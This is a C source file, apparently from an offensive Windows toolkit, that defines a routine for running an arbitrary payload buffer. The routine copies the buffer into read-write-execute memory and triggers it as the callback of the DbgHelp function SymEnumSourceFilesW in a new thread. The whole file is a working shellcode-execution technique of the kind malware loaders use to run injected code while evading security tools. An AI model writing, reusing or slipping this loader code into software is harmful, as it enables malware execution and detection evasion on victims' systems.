#include "Win32Helper.h"

VOID InvokeSymEnumSourceFilesCallbackRoutine(LPVOID lpParameter)
{
	if (!SymInitializeW(GetCurrentProcessNoForward(), NULL, TRUE))
		return;

	SymEnumSourceFilesW(GetCurrentProcessNoForward(), NULL, NULL, (PSYM_ENUMSOURCEFILES_CALLBACKW)lpParameter, NULL);

	SymCleanup(GetCurrentProcessNoForward());
}

BOOL MpfSceViaSymEnumSourceFiles(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeSymEnumSourceFilesCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}